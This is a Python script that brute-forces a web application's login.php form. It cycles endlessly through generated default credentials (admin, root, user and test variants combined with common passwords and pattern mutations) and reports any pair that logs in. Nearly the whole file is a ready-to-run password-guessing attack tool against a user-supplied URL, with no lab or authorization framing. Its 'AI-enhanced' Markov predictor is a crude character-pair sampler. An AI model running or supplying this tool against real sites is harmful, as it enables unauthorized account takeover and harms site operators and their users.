import requests
import itertools
import random
import string
from collections import defaultdict

COMMON_CREDENTIALS = [
    (user, password) for user in [
        "admin","superadmin", "Admin", "ADMIN", "aDmin", "adMin", "admIn", "admin1", "administrator",
        "root", "Root", "ROOT", "rOot", "roOt", "rooT", "root1",
        "user", "User", "USER", "uSer", "usEr", "useR", "user1",
        "test", "Test", "TEST", "tEst", "teSt", "tesT", "test1"
    ] for password in [
        "admin","user", "password", "123456", "1234", "admin123", "letmein", "qwerty", "welcome",
        "login", "123123", "admin@123", "superadmin", "123qwe", "123321", "password1", "pass123",
        "654321", "adminadmin", "root123", "admin2024", "trustno1", "secure","123456789@Ab"
    ]
]

# AI-enhanced password prediction using Markov model
class PasswordPredictor:
    def __init__(self):
        self.model = defaultdict(list)
        self.train(COMMON_CREDENTIALS)

    def train(self, credentials):
        for _, password in credentials:
            for i in range(len(password) - 1):
                self.model[password[i]].append(password[i + 1])

    def generate_password(self, length=12):
        password = random.choice(list(self.model.keys()))
        for _ in range(length - 1):
            next_chars = self.model.get(password[-1], string.ascii_letters + string.digits + "!@#$%^&*()")
            password += random.choice(next_chars)
        return password

password_predictor = PasswordPredictor()

def generate_common_passwords():
    patterns = [
        "password", "admin", "root", "user", "test", "welcome", "letmein", "secure",
        "trustno1", "access", "pass", "hello", "1234", "4321", "abc123", "qwerty","ab","Ab"
    ]
    numbers = ["123", "1234", "12345", "123456", "2023", "2024", "!", "@", "#", "$", "%"]
    symbols = ["!", "@", "#", "$", "%", "^", "&", "*"]
    
    password_variants = [n + p for n, p in itertools.product(numbers, patterns)]
    password_variants += [p + n for p, n in itertools.product(patterns, numbers)]
    password_variants += [p + random.choice(symbols) for p in patterns]
    password_variants += [password_predictor.generate_password() for _ in range(100)]
    
    return password_variants

username_variants = [
    "Admin", "admin", "ADMIN", "aDmin", "AdMin", "AdmIN", "adMIN", "Adm1n"
]

COMMON_CREDENTIALS.extend([(user, pwd) for user in username_variants for pwd in generate_common_passwords()])

def brute_force_login(login_url):
    """Thử brute-force đăng nhập liên tục đến khi dừng bằng Ctrl+C hoặc tìm thấy tài khoản hợp lệ"""
    session = requests.Session()
    headers = {"User-Agent": "Mozilla/5.0"}
    
    try:
        for username, password in itertools.cycle(COMMON_CREDENTIALS):  # Lặp vô hạn
            data = {"username": username, "password": password}
            try:
                response = session.post(login_url, data=data, headers=headers, timeout=5)
                print(f"[*] Trying: {username}:{password}")
                print(f"Response: {response.text[:200]}")
                if "Invalid" not in response.text and response.status_code == 200:
                    print(f"[✔] Login successful: {username}:{password}")
                    return
                else:
                    print(f"[-] Failed: {username}:{password}")
            except requests.RequestException as e:
                print(f"[!] Error: {e}")
    except KeyboardInterrupt:
        print("\n[!] Brute-force stopped by user.")

if __name__ == "__main__":
    target_url = input("Enter base URL: ")
    login_url = target_url.rstrip("/") + "/login.php"
    brute_force_login(login_url)
